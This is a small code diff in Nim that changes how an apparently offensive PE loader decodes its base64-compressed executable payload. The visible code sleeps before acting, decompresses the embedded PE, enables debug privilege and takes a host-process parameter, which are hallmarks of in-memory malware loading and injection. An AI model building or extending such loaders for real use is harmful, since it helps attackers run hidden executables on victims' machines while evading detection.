@@ -4,6 +4,7 @@ import params
 # External
 import os
 import winim/inc/windef
+from std/base64 import decode
 from zip/zlib import uncompress
 
 # Import per module chosen
@@ -19,7 +20,7 @@ proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(),
     sleep(sleepSeconds * 1000)
 
     # Decode and decompress PE
-    var compressedPe = decode64(compressedBase64PE, is_bin=true)
+    var compressedPe = decode(compressedBase64PE)
     var peStr = uncompress(compressedPe)
 
     # Enable debug privilege
